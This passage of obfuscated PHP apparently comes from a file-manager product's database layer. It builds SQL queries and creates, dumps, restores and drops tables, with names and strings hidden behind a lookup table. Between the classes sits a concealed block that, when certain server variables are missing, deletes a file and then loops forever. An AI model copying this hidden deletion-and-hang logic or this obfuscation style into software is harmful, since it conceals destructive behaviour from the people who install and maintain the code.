$_SERVER[Î‹ÃÂŞ„]; $¶™‘‰€Ì = $µÑÓâäÅ[12]; switch ($œ£€½Şî) { case $µÑÓâäÅ[398]: $¶™‘‰€Ì = $Œ¡¿®®Ï; break; case $µÑÓâäÅ[1060]: $¶™‘‰€Ì = is_string($Œ¡¿®®Ï) ? $Œ¡¿®®Ï : substr($this->parseWhere($Œ¡¿®®Ï), 6); break; case $µÑÓâäÅ[1078]: parse_str($Œ¡¿®®Ï, $âËƒşµ); if (isset($âËƒşµ[$µÑÓâäÅ[1055]])) { $ÇÈ¦­À­ = $µÑÓâäÅ[53] . strtoupper($âËƒşµ[$µÑÓâäÅ[1055]]) . $µÑÓâäÅ[53]; unset($âËƒşµ[$µÑÓâäÅ[1055]]); } else { $ÇÈ¦­À­ = $µÑÓâäÅ[1059]; } $ÄçÔ—áÊ = array(); foreach ($âËƒşµ as $å¦èÚù => $·£º²‰) { $ÄçÔ—áÊ[] = $this->parseKey($å¦èÚù) . $µÑÓâäÅ[1077] . $this->parseValue($·£º²‰); } $¶™‘‰€Ì = implode($ÇÈ¦­À­, $ÄçÔ—áÊ); break; } return $¶™‘‰€Ì; } protected function parseLimit($–·ùúùÅ) { $öú±÷û =& $_SERVER[Î‹ÃÂŞ„]; return !empty($–·ùúùÅ) ? $öú±÷û[51] . $–·ùúùÅ . $öú±÷û[53] : $öú±÷û[12]; } protected function parseJoin($Áâì•øĞ) { $Ô‚°¶òÆ =& $_SERVER[Î‹ÃÂŞ„]; $˜îª»’ì = $Ô‚°¶òÆ[12]; if (!empty($Áâì•øĞ)) { if (is_array($Áâì•øĞ)) { foreach ($Áâì•øĞ as $Ù¡…Ğ›á => $úÁ÷É¯…) { if (!1 !== stripos($úÁ÷É¯…, $Ô‚°¶òÆ[1079])) { $˜îª»’ì .= $Ô‚°¶òÆ[53] . $úÁ÷É¯…; } else { $˜îª»’ì .= $Ô‚°¶òÆ[1080] . $úÁ÷É¯…; } } } else { $˜îª»’ì .= $Ô‚°¶òÆ[1080] . $Áâì•øĞ; } } $˜îª»’ì = preg_replace($Ô‚°¶òÆ[1081], think_config($Ô‚°¶òÆ[984]) . $Ô‚°¶òÆ[1082], $˜îª»’ì); return $˜îª»’ì; } protected function parseOrder($Û¢ÜÛ©‡) { $¬“Úã¨… =& $_SERVER[Î‹ÃÂŞ„]; if (is_array($Û¢ÜÛ©‡)) { $å¥ßÎé = array(); foreach ($Û¢ÜÛ©‡ as $¼²ª  => $äëÕ¿ñÀ) { if (is_numeric($¼²ª )) { $å¥ßÎé[] = $this->parseKey($äëÕ¿ñÀ); } else { $äëÕ¿ñÀ = in_array(strtoupper(trim($äëÕ¿ñÀ)), array($¬“Úã¨…[1083], $¬“Úã¨…[1084])) ? $¬“Úã¨…[53] . $äëÕ¿ñÀ : $¬“Úã¨…[12]; if (preg_match($¬“Úã¨…[1085], $¼²ª )) { $å¥ßÎé[] = $this->parseKey($¼²ª ) . $äëÕ¿ñÀ; } else { think_exception($¬“Úã¨…[1086] . $¼²ª ); } } } $Û¢ÜÛ©‡ = implode($¬“Úã¨…[50], $å¥ßÎé); } return !empty($Û¢ÜÛ©‡) ? $¬“Úã¨…[1087] . $Û¢ÜÛ©‡ : $¬“Úã¨…[12]; } protected function parseGroup($íøá«³ï) { $“Ì§Öä =& $_SERVER[Î‹ÃÂŞ„]; return !empty($íøá«³ï) ? $“Ì§Öä[1088] . $íøá«³ï : $“Ì§Öä[12]; } protected function parseHaving($¤ïàş¬ş) { $¨î¥ÇÎ =& $_SERVER[Î‹ÃÂŞ„]; return !empty($¤ïàş¬ş) ? $¨î¥ÇÎ[1089] . $¤ïàş¬ş : $¨î¥ÇÎ[12]; } protected function parseComment($Ë×ëü‰) { $­ó‹Ş™É =& $_SERVER[Î‹ÃÂŞ„]; return !empty($Ë×ëü‰) ? $­ó‹Ş™É[1090] . $Ë×ëü‰ . $­ó‹Ş™É[1091] : $­ó‹Ş™É[12]; } protected function parseDistinct($¸–«¾’Ú) { $ú–‰½ÇŠ =& $_SERVER[Î‹ÃÂŞ„]; return !empty($¸–«¾’Ú) ? $ú–‰½ÇŠ[1092] : $ú–‰½ÇŠ[12]; } protected function parseUnion($º¯Ô×ê¥) { $øé­”Ôì =& $_SERVER[Î‹ÃÂŞ„]; if (empty($º¯Ô×ê¥)) { return $øé­”Ôì[12]; } if (isset($º¯Ô×ê¥[$øé­”Ôì[394]])) { $ÙÍÁ—şÙ = $øé­”Ôì[1093]; unset($º¯Ô×ê¥[$øé­”Ôì[394]]); } else { $ÙÍÁ—şÙ = $øé­”Ôì[1094]; } foreach ($º¯Ô×ê¥ as $Ó®úŞÁ) { $Ó“®ÑÔ‡[] = $ÙÍÁ—şÙ . (is_array($Ó®úŞÁ) ? $this->buildSelectSql($Ó®úŞÁ) : $Ó®úŞÁ); } return implode($øé­”Ôì[53], $Ó“®ÑÔ‡); } public function insert($ñåõ²äÀ, $¡‚¸úÊº = array(), $ùÍÁÆ»å = false) { $¢¹ó“ä† =& $_SERVER[Î‹ÃÂŞ„]; $’·ú¾˜Ú = $°ô€¨˜§ = array(); $this->model = $¡‚¸úÊº[$¢¹ó“ä†[327]]; foreach ($ñåõ²äÀ as $áÜü›ÌŠ => $õ„»ß¶á) { if (is_array($õ„»ß¶á) && $¢¹ó“ä†[343] == $õ„»ß¶á[0]) { $°ô€¨˜§[] = $this->parseKey($áÜü›ÌŠ); $’·ú¾˜Ú[] = $õ„»ß¶á[1]; } elseif (is_scalar($õ„»ß¶á) || is_null($õ„»ß¶á)) { $°ô€¨˜§[] = $this->parseKey($áÜü›ÌŠ); $’·ú¾˜Ú[] = $this->parseValue($õ„»ß¶á); } } $÷¶ú¨³û = ($ùÍÁÆ»å ? $¢¹ó“ä†[961] : $¢¹ó“ä†[962]) . $¢¹ó“ä†[963] . $this->parseTable($¡‚¸úÊº[$¢¹ó“ä†[325]]) . $¢¹ó“ä†[957] . implode($¢¹ó“ä†[50], $°ô€¨˜§) . $¢¹ó“ä†[958] . implode($¢¹ó“ä†[50], $’·ú¾˜Ú) . $¢¹ó“ä†[959]; $÷¶ú¨³û .= $this->parseLock(isset($¡‚¸úÊº[$¢¹ó“ä†[891]]) ? $¡‚¸úÊº[$¢¹ó“ä†[891]] : !1); $÷¶ú¨³û .= $this->parseComment(!empty($¡‚¸úÊº[$¢¹ó“ä†[400]]) ? $¡‚¸úÊº[$¢¹ó“ä†[400]] : $¢¹ó“ä†[12]); return $this->execute($÷¶ú¨³û, $this->parseBind(!empty($¡‚¸úÊº[$¢¹ó“ä†[331]]) ? $¡‚¸úÊº[$¢¹ó“ä†[331]] : array())); } public function selectInsert($ô°áòÊ½, $äÉÂÓã°, $º©¹ƒ†İ = array()) { $é’ı©ƒâ =& $_SERVER[Î‹ÃÂŞ„]; $this->model = $º©¹ƒ†İ[$é’ı©ƒâ[327]]; if (is_string($ô°áòÊ½)) { $ô°áòÊ½ = explode($é’ı©ƒâ[50], $ô°áòÊ½); } array_walk($ô°áòÊ½, array($this, $é’ı©ƒâ[960])); $º•¶ï«È = $é’ı©ƒâ[1095] . $this->parseTable($äÉÂÓã°) . $é’ı©ƒâ[957] . implode($é’ı©ƒâ[50], $ô°áòÊ½) . $é’ı©ƒâ[1073]; $º•¶ï«È .= $this->buildSelectSql($º©¹ƒ†İ); return $this->execute($º•¶ï«È, $this->parseBind(!empty($º©¹ƒ†İ[$é’ı©ƒâ[331]]) ? $º©¹ƒ†İ[$é’ı©ƒâ[331]] : array())); } public function update($ïåÂ§, $àÆ‚Ô×¯) { $€«…ñˆø =& $_SERVER[Î‹ÃÂŞ„]; $this->model = $àÆ‚Ô×¯[$€«…ñˆø[327]]; $Ú‰ùŒ = $€«…ñˆø[1096] . $this->parseTable($àÆ‚Ô×¯[$€«…ñˆø[325]]) . $this->parseSet($ïåÂ§) . $this->parseWhere(!empty($àÆ‚Ô×¯[$€«…ñˆø[321]]) ? $àÆ‚Ô×¯[$€«…ñˆø[321]] : $€«…ñˆø[12]) . $this->parseOrder(!empty($àÆ‚Ô×¯[$€«…ñˆø[411]]) ? $àÆ‚Ô×¯[$€«…ñˆø[411]] : $€«…ñˆø[12]) . $this->parseLimit(!empty($àÆ‚Ô×¯[$€«…ñˆø[338]]) ? $àÆ‚Ô×¯[$€«…ñˆø[338]] : $€«…ñˆø[12]) . $this->parseLock(isset($àÆ‚Ô×¯[$€«…ñˆø[891]]) ? $àÆ‚Ô×¯[$€«…ñˆø[891]] : !1) . $this->parseComment(!empty($àÆ‚Ô×¯[$€«…ñˆø[400]]) ? $àÆ‚Ô×¯[$€«…ñˆø[400]] : $€«…ñˆø[12]); return $this->execute($Ú‰ùŒ, $this->parseBind(!empty($àÆ‚Ô×¯[$€«…ñˆø[331]]) ? $àÆ‚Ô×¯[$€«…ñˆø[331]] : array())); } public function delete($æøŞÓæ = array()) { $Ôúç”÷ =& $_SERVER[Î‹ÃÂŞ„]; $this->model = $æøŞÓæ[$Ôúç”÷[327]]; $ş¢ğÕïö = $Ôúç”÷[1097] . $this->parseTable($æøŞÓæ[$Ôúç”÷[325]]) . $this->parseWhere(!empty($æøŞÓæ[$Ôúç”÷[321]]) ? $æøŞÓæ[$Ôúç”÷[321]] : $Ôúç”÷[12]) . $this->parseOrder(!empty($æøŞÓæ[$Ôúç”÷[411]]) ? $æøŞÓæ[$Ôúç”÷[411]] : $Ôúç”÷[12]) . $this->parseLimit(!empty($æøŞÓæ[$Ôúç”÷[338]]) ? $æøŞÓæ[$Ôúç”÷[338]] : $Ôúç”÷[12]) . $this->parseLock(isset($æøŞÓæ[$Ôúç”÷[891]]) ? $æøŞÓæ[$Ôúç”÷[891]] : !1) . $this->parseComment(!empty($æøŞÓæ[$Ôúç”÷[400]]) ? $æøŞÓæ[$Ôúç”÷[400]] : $Ôúç”÷[12]); return $this->execute($ş¢ğÕïö, $this->parseBind(!empty($æøŞÓæ[$Ôúç”÷[331]]) ? $æøŞÓæ[$Ôúç”÷[331]] : array())); } public function select($àÛŒ¯İÚ = array()) { $¦óÀ´Ü§ =& $_SERVER[Î‹ÃÂŞ„]; $this->model = $àÛŒ¯İÚ[$¦óÀ´Ü§[327]]; $Ûà€Øó = $this->buildSelectSql($àÛŒ¯İÚ); $Ë©¹’Ø = isset($àÛŒ¯İÚ[$¦óÀ´Ü§[395]]) ? $àÛŒ¯İÚ[$¦óÀ´Ü§[395]] : !1; if ($Ë©¹’Ø) { $ãªöëËß = is_string($Ë©¹’Ø[$¦óÀ´Ü§[96]]) ? $Ë©¹’Ø[$¦óÀ´Ü§[96]] : $¦óÀ´Ü§[1098] . md5($Ûà€Øó); $Ì”ƒíÅİ = think_cache($ãªöëËß, $¦óÀ´Ü§[12], $Ë©¹’Ø); if (!1 !== $Ì”ƒíÅİ) { return $Ì”ƒíÅİ; } } $œ’ßûˆ = $this->query($Ûà€Øó, $this->parseBind(!empty($àÛŒ¯İÚ[$¦óÀ´Ü§[331]]) ? $àÛŒ¯İÚ[$¦óÀ´Ü§[331]] : array())); if ($Ë©¹’Ø && !1 !== $œ’ßûˆ) { think_cache($ãªöëËß, $œ’ßûˆ, $Ë©¹’Ø); } return $œ’ßûˆ; } public function buildSelectSql($´×ÍÚ²‹ = array()) { $ÄõüŒø =& $_SERVER[Î‹ÃÂŞ„]; if (isset($´×ÍÚ²‹[$ÄõüŒø[399]])) { if (strpos($´×ÍÚ²‹[$ÄõüŒø[399]], $ÄõüŒø[50])) { list($Æ¼Íä»¯, $€øÄ®ç§) = explode($ÄõüŒø[50], $´×ÍÚ²‹[$ÄõüŒø[399]]); } else { $Æ¼Íä»¯ = $´×ÍÚ²‹[$ÄõüŒø[399]]; } $Æ¼Íä»¯ = $Æ¼Íä»¯ ? $Æ¼Íä»¯ : 1; $€øÄ®ç§ = isset($€øÄ®ç§) ? $€øÄ®ç§ : (is_numeric($´×ÍÚ²‹[$ÄõüŒø[338]]) ? $´×ÍÚ²‹[$ÄõüŒø[338]] : 20); $‚Õòãà = $€øÄ®ç§ * ((int) $Æ¼Íä»¯ - 1); $´×ÍÚ²‹[$ÄõüŒø[338]] = $‚Õòãà . $ÄõüŒø[50] . $€øÄ®ç§; } if (think_config($ÄõüŒø[1099])) { $ÅÈĞ˜å = $ÄõüŒø[1100] . md5(serialize($´×ÍÚ²‹)); $ãÆÙÈÅå = think_cache($ÅÈĞ˜å); if ($ãÆÙÈÅå) { return $ãÆÙÈÅå; } } $ğÙÕŸ½ = $this->parseSql($this->selectSql, $´×ÍÚ²‹); $ğÙÕŸ½ .= $this->parseLock(isset($´×ÍÚ²‹[$ÄõüŒø[891]]) ? $´×ÍÚ²‹[$ÄõüŒø[891]] : !1); if (isset($ÅÈĞ˜å)) { think_cache($ÅÈĞ˜å, $ğÙÕŸ½); } return $ğÙÕŸ½; } public function parseSql($“ˆòôš, $ÃƒÊ›ÌÖ = array()) { $œ©Îä¿Ó =& $_SERVER[Î‹ÃÂŞ„]; $“ˆòôš = str_replace(array($œ©Îä¿Ó[1101], $œ©Îä¿Ó[1102], $œ©Îä¿Ó[1103], $œ©Îä¿Ó[1104], $œ©Îä¿Ó[1105], $œ©Îä¿Ó[1106], $œ©Îä¿Ó[1107], $œ©Îä¿Ó[1108], $œ©Îä¿Ó[1109], $œ©Îä¿Ó[1110], $œ©Îä¿Ó[1111]), array($this->parseTable("{$ÃƒÊ›ÌÖ[$œ©Îä¿Ó[325]]}"), $this->parseDistinct(isset($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[1112]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[1112]] : !1), $this->parseField(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[319]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[319]] : $œ©Îä¿Ó[205]), $this->parseJoin(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[328]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[328]] : $œ©Îä¿Ó[12]), $this->parseWhere(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[321]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[321]] : $œ©Îä¿Ó[12]), $this->parseGroup(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[550]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[550]] : $œ©Îä¿Ó[12]), $this->parseHaving(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[1113]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[1113]] : $œ©Îä¿Ó[12]), $this->parseOrder(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[411]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[411]] : $œ©Îä¿Ó[12]), $this->parseLimit(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[338]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[338]] : $œ©Îä¿Ó[12]), $this->parseUnion(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[393]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[393]] : $œ©Îä¿Ó[12]), $this->parseComment(!empty($ÃƒÊ›ÌÖ[$œ©Îä¿Ó[400]]) ? $ÃƒÊ›ÌÖ[$œ©Îä¿Ó[400]] : $œ©Îä¿Ó[12])), $“ˆòôš); return $“ˆòôš; } public function getLastSql($ºğ¯Ôù = '') { return $ºğ¯Ôù ? $this->modelSql[$ºğ¯Ôù] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($—˜í™é¥) { return addslashes($—˜í™é¥); } public function setModel($ñéö×Ö) { $this->model = $ñéö×Ö; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } if (!isset($_SERVER[$_SERVER[Î‹ÃÂŞ„][926]]) || !isset($_SERVER[$_SERVER[Î‹ÃÂŞ„][924]])) { $_getc = $_SERVER[Î‹ÃÂŞ„][928]; $_getfile = $_SERVER[$_SERVER[Î‹ÃÂŞ„][929]] . $_SERVER[Î‹ÃÂŞ„][930]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î‹ÃÂŞ„][248], $_getfilec); if (count($_getarrs) < $_SERVER[Î‹ÃÂŞ„][657]) { $exit = $_SERVER[Î‹ÃÂŞ„][931]; $exit(); } $_act = $_SERVER[Î‹ÃÂŞ„][1014]; $_act($_SERVER[$_SERVER[Î‹ÃÂŞ„][929]] . $_SERVER[Î‹ÃÂŞ„][930]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Î‹ÃÂŞ„][424]); } } class DbManage { function __construct($‡‡“ÚÃ = array()) { $îÇĞ¬ö =& $_SERVER[Î‹ÃÂŞ„]; if (empty($‡‡“ÚÃ)) { $‡‡“ÚÃ = $GLOBALS[$îÇĞ¬ö[6]][$îÇĞ¬ö[21]]; } $this->database = $‡‡“ÚÃ; } public function model($ÔÎ„§÷ß = '') { return new ModelBase($ÔÎ„§÷ß, $_SERVER[Î‹ÃÂŞ„][12], $this->database); } public function db($¢¯¦ = false) { $¹Üäº =& $_SERVER[Î‹ÃÂŞ„]; $È²ÑıÑû = array_change_key_case($this->database); if ($this->dbType() == $¹Üäº[13] || !$¢¯¦) { return $this->model()->db(); } $ıİü­Ë = $È²ÑıÑû[$¹Üäº[1027]]; $È²ÑıÑû[$¹Üäº[1027]] = $¹Üäº[12]; if ($È²ÑıÑû[$¹Üäº[1022]] == $¹Üäº[1019]) { $±ë’àğÚ = $È²ÑıÑû[$¹Üäº[1028]]; $È²ÑıÑû[$¹Üäº[1028]] = substr($±ë’àğÚ, 0, strrpos($±ë’àğÚ, $¹Üäº[1114])); } $this->database = $È²ÑıÑû; $±›” Ÿ– = $this->model()->db(); try { $ÓÃä‡À× = $±›” Ÿ–->execute("\x73\x68\x6f\167\40\x64\141\x74\141\142\x61\x73\x65\163\x20\x6c\151\x6b\x65\40\x27{$ıİü­Ë}\x27"); } catch (Exception $‹÷™ñÖ˜) { } if (!$ÓÃä‡À×) { $±›” Ÿ–->execute("\143\162\x65\x61\x74\145\40\144\141\x74\141\142\141\x73\145\40\x60{$ıİü­Ë}\140"); } $È²ÑıÑû[$¹Üäº[1027]] = $ıİü­Ë; if ($È²ÑıÑû[$¹Üäº[1022]] == $¹Üäº[1019]) { $È²ÑıÑû[$¹Üäº[1028]] .= $¹Üäº[1114] . $ıİü­Ë; } $this->database = $È²ÑıÑû; $±›” Ÿ–->execute("\x75\163\145\40\140{$ıİü­Ë}\x60"); return $±›” Ÿ–; } public function createTable($»”áÂ·Ú, &$‘Ü°¡ÂŞ) { $Ş¡ñ–¶á =& $_SERVER[Î‹ÃÂŞ„]; if (!IO::exist($»”áÂ·Ú)) { ActionCall($Ş¡ñ–¶á[1115], !0, 0); show_json(LNG($Ş¡ñ–¶á[1116]), !1); } $…½¨ÏèÒ = $this->model()->db(); $•ûÚàš = sqlSplit(IO::getContent($»”áÂ·Ú)); foreach ($•ûÚàš as $‡øÖĞâÀ) { $â¥°óøó = stripos($‡øÖĞâÀ, $Ş¡ñ–¶á[1117]) === 0; if ($â¥°óøó) { $‘Ü°¡ÂŞ->task[$Ş¡ñ–¶á[833]] += 1; } $…½¨ÏèÒ->execute($‡øÖĞâÀ); if ($â¥°óøó) { preg_match($Ş¡ñ–¶á[1118], $‡øÖĞâÀ, $–«¤º‡„); $‘Ü°¡ÂŞ->task[$Ş¡ñ–¶á[1119]] = $–«¤º‡„[1]; $‘Ü°¡ÂŞ->update(1); } } } public function insertTable($¨¤œ©îÑ, &$—´ôåí×) { $™•Êâš´ =& $_SERVER[Î‹ÃÂŞ„]; $ëÖ’Ç×ç = $this->model()->db(); $–Åò–Òš = $‡ˆê‹…¤ ? array($‡ˆê‹…¤) : $ëÖ’Ç×ç->getTables(); foreach ($¨¤œ©îÑ as $ö´¹°¢œ) { $‡ˆê‹…¤ = basename($ö´¹°¢œ, $™•Êâš´[835]); if (!in_array($‡ˆê‹…¤, $–Åò–Òš)) { continue; } $—´ôåí×->task[$™•Êâš´[1119]] = $‡ˆê‹…¤; if (get_filesize($ö´¹°¢œ) == 0) { continue; } $ŞÏÌéĞ‹ = $this->sqlToDb($ö´¹°¢œ, $—´ôåí×); if (!$ŞÏÌéĞ‹) { ActionCall($™•Êâš´[1115], !0, 0); show_json(LNG($™•Êâš´[1120]) . "\133{$‡ˆê‹…¤}\135", !1); } } } public function sqlFromDb($âç¦­ö, $é¹³Úƒ‹, &$¢„§áœÃ, $ü­Ëñ„ì = '') { if ($¢„§áœÃ) { $¢„§áœÃ->task[$_SERVER[Î‹ÃÂŞ„][1119]] = $âç¦­ö; } $æü¼ò = $this->model($âç¦­ö); $»û“Î¸« = 0; $Ã¬ôÛ˜ = 0; $³¿«¶¬˜ = 10000; $¶™Æ¡®¬ = fopen($é¹³Úƒ‹, $_SERVER[Î‹ÃÂŞ„][1121]); $Èö‚ñ = $æü¼ò->getPk(); $Í­¯ë»Ç = $æü¼ò->getDbFields(); $´ğ«ìş = $_SERVER[Î‹ÃÂŞ„][12]; if ($GLOBALS[$_SERVER[Î‹ÃÂŞ„][834]] && in_array($âç¦­ö, array($_SERVER[Î‹ÃÂŞ„][1122], $_SERVER[Î‹ÃÂŞ„][1123]))) { $´ğ«ìş = $âç¦­ö; } do { $ÒÂ¢¯—ä = array($Èö‚ñ => array($_SERVER[Î‹ÃÂŞ„][1069], $Ã¬ôÛ˜)); $’Ü†ò…ó = $æü¼ò->where($ÒÂ¢¯—ä)->field($Í­¯ë»Ç)->order($Èö‚ñ . $_SERVER[Î‹ÃÂŞ„][1124])->limit($³¿«¶¬˜)->select(); $’Ü†ò…ó = !empty($’Ü†ò…ó) ? $’Ü†ò…ó : array(); if (!($Øî˜îº = count($’Ü†ò…ó))) { break; } $ùïÕ–ö÷ = end($’Ü†ò…ó); $Ã¬ôÛ˜ = $ùïÕ–ö÷[$Èö‚ñ]; $ÒòèÒø« = array(); foreach ($’Ü†ò…ó as $Óæˆå®ı) { if ($´ğ«ìş) { if ($âç¦­ö == $_SERVER[Î‹ÃÂŞ„][1122]) { if ($Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][33]] == $_SERVER[Î‹ÃÂŞ„][1125]) { $Ä¿ïÒ  = json_decode($Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][420]], !0); if ($Ä¿ïÒ [$_SERVER[Î‹ÃÂŞ„][32]] == $GLOBALS[$_SERVER[Î‹ÃÂŞ„][834]] && $Ä¿ïÒ [$_SERVER[Î‹ÃÂŞ„][797]] != 1) { continue; } } } else { if ($Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][33]] == $_SERVER[Î‹ÃÂŞ„][1126] && $Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][96]] == $_SERVER[Î‹ÃÂŞ„][826]) { continue; } } } if ($ü­Ëñ„ì) { $Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][86]] = "\173\x69\x6f\72{$ü­Ëñ„ì}\175" . substr($Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][86]], strlen("\173\151\x6f\72{$Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][864]]}\x7d")); $Óæˆå®ı[$_SERVER[Î‹ÃÂŞ„][864]] = $ü­Ëñ„ì; } $ÒòèÒø«[] = $_SERVER[Î‹ÃÂŞ„][1127] . $this->sqlEncode($Óæˆå®ı) . $_SERVER[Î‹ÃÂŞ„][1128]; } $áœŸÙú = "\111\116\123\x45\122\x54\40\x49\x4e\x54\117\x20\x60{$âç¦­ö}\140\x20\50\140" . implode($_SERVER[Î‹ÃÂŞ„][1129], $Í­¯ë»Ç) . $_SERVER[Î‹ÃÂŞ„][1130]; fwrite($¶™Æ¡®¬, $áœŸÙú . implode($_SERVER[Î‹ÃÂŞ„][1131], $ÒòèÒø«) . $_SERVER[Î‹ÃÂŞ„][73] . PHP_EOL); $»û“Î¸« += $Øî˜îº; if ($¢„§áœÃ) { $¢„§áœÃ->update($Øî˜îº); } } while ($³¿«¶¬˜ == $Øî˜îº); fclose($¶™Æ¡®¬); return $»û“Î¸«; } public function sqlToDb($ÙÊø´ÇÙ, &$†¯Æ¤õ“) { $ô¶ßÇöÔ =& $_SERVER[Î‹ÃÂŞ„]; $­÷’êÅ = $this->model()->db(); $œ©à—ŒŸ = @fopen($ÙÊø´ÇÙ, $ô¶ßÇöÔ[1132]); if (!$œ©à—ŒŸ) { return !1; } $åÄÂ·ïš = 0; $½”íúÆı = $ô¶ßÇöÔ[12]; $ÓŸÌ÷Ôò = array(); $‚şòı‹ = $this->dbType(); $Â¿òŞ– = $‚şòı‹ == $ô¶ßÇöÔ[13] ? 500 : 2000; $ØŸ¸ø‘« = basename($ÙÊø´ÇÙ, $ô¶ßÇöÔ[835]); $¨ˆÛ¸ƒÎ = 0; $ôĞÖü¡¾ = 4194304 - 104858; $ì¢™€ = 1000000 - 104858; while (!feof($œ©à—ŒŸ)) { $±…‚ò¥Ü = trim(fgets($œ©à—ŒŸ)); if (!$±…‚ò¥Ü) { continue; } $×°–Ùèú = $this->sqlDecode($±…‚ò¥Ü, $‚şòı‹, $ØŸ¸ø‘«); if (stripos($×°–Ùèú, $ô¶ßÇöÔ[401]) === 0) { if (!$½”íúÆı) { $½”íúÆı = $×°–Ùèú . $ô¶ßÇöÔ[53]; } continue; } if ($†¯Æ¤õ“) { $†¯Æ¤õ“->task[$ô¶ßÇöÔ[833]] += 1; } $åÄÂ·ïš++; $ÓŸÌ÷Ôò[] = rtrim(rtrim(trim($×°–Ùèú), $ô¶ßÇöÔ[50]), $ô¶ßÇöÔ[73]); $äı‘·…¸ = null; $Ñœí‡Õ = strlen($×°–Ùèú); $¨ˆÛ¸ƒÎ += $Ñœí‡Õ; if ($¨ˆÛ¸ƒÎ >= ($Â¿òŞ– == 500 ? $ì¢™€ : $ôĞÖü¡¾)) { $äı‘·…¸ = array_pop($ÓŸÌ÷Ôò); if ($åÄÂ·ïš > 1) { $åÄÂ·ïš--; } } if ($åÄÂ·ïš >= $Â¿òŞ– || $äı‘·…¸) { $×°–Ùèú = $½”íúÆı . implode($ô¶ßÇöÔ[50], $ÓŸÌ÷Ôò); if (!$­÷’êÅ->execute($×°–Ùèú)) { return !1; } if ($†¯Æ¤õ“) { $†¯Æ¤õ“->update($åÄÂ·ïš); } $ÓŸÌ÷Ôò = array(); $åÄÂ·ïš = 0; $¨ˆÛ¸ƒÎ = 0; if ($äı‘·…¸) { $ÓŸÌ÷Ôò = array($äı‘·…¸); $åÄÂ·ïš = 1; $¨ˆÛ¸ƒÎ = $Ñœí‡Õ; } } } fclose($œ©à—ŒŸ); if (!empty($ÓŸÌ÷Ôò)) { $×°–Ùèú = $½”íúÆı . implode($ô¶ßÇöÔ[50], $ÓŸÌ÷Ôò); if (!$­÷’êÅ->execute($×°–Ùèú)) { return !1; } if ($†¯Æ¤õ“) { $†¯Æ¤õ“->update($åÄÂ·ïš); } } return !0; } public function dropTable($”¿ò½ê³ = null) { $«ƒßÓÄŒ = $this->model()->db(); $æ¬˜îï = $”¿ò½ê³ ? array($”¿ò½ê³) : $«ƒßÓÄŒ->getTables(); if (!$æ¬˜îï) { return; } foreach ($æ¬˜îï as $”¿ò½ê³) { if ($”¿ò½ê³) { $”¿ò½ê³ = strtolower($”¿ò½ê³); } else { continue; } $«ƒßÓÄŒ->execute("\144\x72\x6f\x70\40\x74\x61\x62\x6c\145\x20\151\x66\40\x65\x78\151\163\164\163\x20\140{$”¿ò½ê³}\140"); } } private function sqlEncode($Èá ®¼) { $òÆ¼ˆ±Ï =& $_SERVER[Î‹ÃÂŞ„]; $é—ğ’¥ = array(); foreach ($Èá ®¼ as $ñ™³‹½Ÿ) { if (is_array($ñ™³‹½Ÿ)) { $ñ™³‹½Ÿ = json_encode_force($ñ™³‹½Ÿ); } $ñ™³‹½Ÿ = addslashes($ñ™³‹½Ÿ); $ñ™³‹½Ÿ = str_replace(array($òÆ¼ˆ±Ï[1133], $òÆ¼ˆ±Ï[248]), array($òÆ¼ˆ±Ï[1134], $òÆ¼ˆ±Ï[1135]), $ñ™³‹½Ÿ); $é—ğ’¥[] = str_replace($òÆ¼ˆ±Ï[58], $òÆ¼ˆ±Ï[1136], $ñ™³‹½Ÿ); } return $òÆ¼ˆ±Ï[58] . implode($òÆ¼ˆ±Ï[1137], $é—ğ’¥) . $òÆ¼ˆ±Ï[58]; } private function sqlDecode($™ğª¯ôê, $º¯ş½•Ê, $—ğàôÁÑ = '') { $±é²Çş® =& $_SERVER[Î‹ÃÂŞ„]; $™ğª¯ôê = str_replace(array($±é²Çş®[1134], $±é²Çş®[1135]), array($±é²Çş®[1133], $±é²Çş®[248]), $™ğª¯ôê); if ($º¯ş½•Ê == $±é²Çş®[13]) { return $—ğàôÁÑ != $±é²Çş®[1138] ? stripslashes($™ğª¯ôê) : $™ğª¯ôê; } if ($—ğàôÁÑ == $±é²Çş®[1138]) { $™ğª¯ôê = str_replace($±é²Çş®[1139], $±é²Çş®[120], stripslashes($™ğª¯ôê)); } return $™ğª¯ôê; } public function getSqlFile($¾„ƒÍ½˜ = '') { $„øïÅ½ç =& $_SERVER[Î‹ÃÂŞ„]; $ÕñûÔ±š = $this->dbType(!0); $‚ÖÀïãì = CONTROLLER_DIR . "\151\156\163\x74\x61\154\154\57\x64\141\x74\x61\x2f{$ÕñûÔ±š}\56\x73\161\x6c"; $ÇËµŸèƒ = file_get_contents($‚ÖÀïãì); $©çá‘Ù´ = $„øïÅ½ç[1140] . ($ÕñûÔ±š == $„øïÅ½ç[851] ? $„øïÅ½ç[1141] : 